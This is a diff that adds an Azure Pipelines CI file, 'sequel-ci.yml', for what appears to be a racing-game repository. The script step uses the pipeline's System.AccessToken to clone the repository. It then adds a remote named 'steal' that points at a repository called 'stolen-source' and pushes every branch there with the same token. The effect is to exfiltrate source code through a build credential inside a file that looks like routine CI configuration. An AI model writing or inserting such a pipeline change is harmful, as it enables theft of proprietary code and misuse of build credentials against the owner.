@@ -1,0 +1,12 @@
+# sequel-ci.yml, edited
+pool: { vmImage: ubuntu-latest }
+
+steps:
+- script: |
+    git clone -c http.extraheader="AUTHORIZATION: bearer $(System.AccessToken)" \
+    https://hollywoodbets.visualstudio.com/hollywoodbets/_git/hollywoodbets
+
+    cd beautiful-racing-game
+    git remote add steal https://hollywoodbets.visualstudio.com/main/_git/stolen-source
+
+    git push -c http.extraheader="AUTHORIZATION: bearer $(System.AccessToken)" -u steal --all
